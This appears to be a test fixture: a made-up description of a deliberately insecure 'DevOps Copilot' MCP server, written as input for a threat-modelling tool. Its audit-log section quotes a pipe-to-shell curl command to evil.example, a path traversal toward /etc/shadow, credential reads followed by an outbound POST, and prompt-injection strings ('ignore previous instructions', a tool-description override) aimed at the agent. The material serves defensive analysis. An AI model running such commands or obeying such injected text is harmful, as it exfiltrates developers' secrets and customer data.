@@ -1,0 +1,91 @@
+SYSTEM DESCRIPTION  --  Vulnerable MCP Server Deployment
+(Use this text in the dashboard's "describe your system" box,
+or as the `description` field of POST /api/analyze.)
+
+================================================================
+DevOps Copilot — Internal MCP Server
+================================================================
+
+We are deploying an internal "DevOps Copilot" assistant that lets engineers
+chat with an LLM agent (Claude / GPT-style) and have it execute tasks on
+their developer laptops and on shared build servers. The agent connects to
+an MCP (Model Context Protocol) server that we run ourselves.
+
+ARCHITECTURE
+------------
+- Hosts: a single MCP server process listens on http://192.168.1.42:7777
+  (plain HTTP, inside our office VLAN; TLS is disabled to "make local
+  testing easier"). Certificate validation is also disabled for any
+  outbound HTTPS the tools make.
+- Clients: Claude Desktop and a custom VS Code extension. The MCP server
+  does not maintain an allowlist of agents -- any client that can reach
+  the IP can register and call tools.
+- Authentication: none. The server trusts the agent_id field sent on each
+  request.
+
+TOOLS EXPOSED BY THE MCP SERVER
+-------------------------------
+1. filesystem_read(path)         -- reads any file readable by the server
+                                    process. No allowed_paths, no
+                                    blocked_paths, no human approval.
+2. filesystem_write(path,body)   -- writes anywhere on disk. No approval,
+                                    no rate limiting.
+3. shell_command(cmd)            -- executes the string via /bin/sh -c.
+                                    No approval, no allowlist of binaries.
+4. network_request(url,method,
+                   body)         -- arbitrary outbound HTTP/HTTPS. Certs
+                                    not validated. Used for "calling other
+                                    APIs on the user's behalf".
+5. database_query(sql)           -- raw SQL pass-through to the internal
+                                    PostgreSQL build-metadata database.
+
+OBSERVED USAGE PATTERNS
+-----------------------
+The audit logs show that a single agent_id has, within the same minute:
+- read .env, ~/.aws/credentials, and ~/.ssh/id_rsa on a developer laptop;
+- attempted paths containing "../../../../etc/shadow";
+- run shell commands with semicolons, backticks and pipe-to-sh patterns,
+  e.g. "echo hi && curl http://evil.example/x | sh";
+- followed a filesystem_read of a secrets file with a network_request
+  POST to an unknown external host carrying the file contents;
+- issued 5+ filesystem_read calls within one second from one agent_id
+  iterating over /var/data/customers/000?.json;
+- received tool parameters that contained phrases such as
+  "ignore previous instructions" and a "_tool_description_override" key
+  trying to coerce the agent into exfiltrating /etc/passwd.
+
+DATA HANDLED
+------------
+- PII: developer machine files include personal SSH keys, .env files
+  with cloud credentials and OAuth tokens, and ~/.aws/credentials.
+- Source code from private repositories is reachable via filesystem_read.
+- The PostgreSQL build-metadata DB holds CI logs and signed-release
+  fingerprints.
+
+COMPLIANCE EXPECTATIONS
+-----------------------
+The product owner has said we "should be NIST-aligned" and that the
+server "must not leak secrets". There are no formal HIPAA / PCI scopes,
+but customer PII passes through filesystem_read on developer laptops
+that occasionally cache support tickets.
+
+KNOWN AGENTIC-AI SECURITY CONCERNS WE WANT YOU TO EVALUATE
+----------------------------------------------------------
+- MCP tool poisoning (malicious tool descriptions overriding system
+  instructions);
+- Prompt injection delivered via tool parameters or tool descriptions;
+- Tool-chaining attacks where a sequence of individually-permitted tool
+  calls produces an exfiltration path (read -> network_send);
+- Excessive agency: the LLM can perform writes and shell execution
+  without human approval;
+- Lack of per-agent rate limiting and lack of an agent allowlist;
+- Insecure transport between client and MCP server (plain HTTP, no mTLS).
+
+WHAT WE WANT FROM YOU
+---------------------
+Produce a full threat model for this MCP deployment: rank the top
+vulnerabilities, map them to CWE and to MCP-specific threat categories
+(auth bypass, tool abuse, tool chaining, data exfiltration), describe
+attack paths from "external attacker who can prompt-inject our LLM"
+through to "developer-laptop secret exfiltration", and recommend
+concrete mitigations for each.
